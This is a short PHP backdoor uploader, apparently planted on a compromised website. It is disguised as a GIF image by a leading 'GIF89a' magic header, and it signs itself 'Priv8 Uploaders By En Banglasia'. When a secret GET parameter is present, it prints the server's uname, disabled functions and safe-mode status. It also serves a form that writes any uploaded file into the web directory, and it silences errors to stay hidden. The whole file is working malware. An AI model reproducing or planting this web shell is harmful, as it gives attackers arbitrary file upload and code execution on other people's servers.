GIF89a;<title>Fuckedz By En Banglasia</title>
<?php 
error_reporting(0);
$Ye = "-..-";
if(isset($_GET["Fuckedz"]))
	{
		Echo "Priv8 Uploaders By En Banglasia{$Ye} <font color=#000FFF>[uname]".php_uname()."[/uname]";Echo "<br>";print "\n";if(@ini_get("disable_functions")){Echo "DisablePHP=".@ini_get("disable_functions");}else{ Echo "Disable PHP = NONE";}Echo "<br>";print "\n";if(@ini_get("safe_mode")){Echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} Echo "<br>";print "\n";Echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){Echo"<b>Hey Idiots? Successfully!</b> ==>>".$_FILES["f"]["name"];}else{Echo"<b>Hey Idiots? Failed!";}} }

echo 'uname:'.php_uname()."\n";
echo getcwd() . "\n";
?>
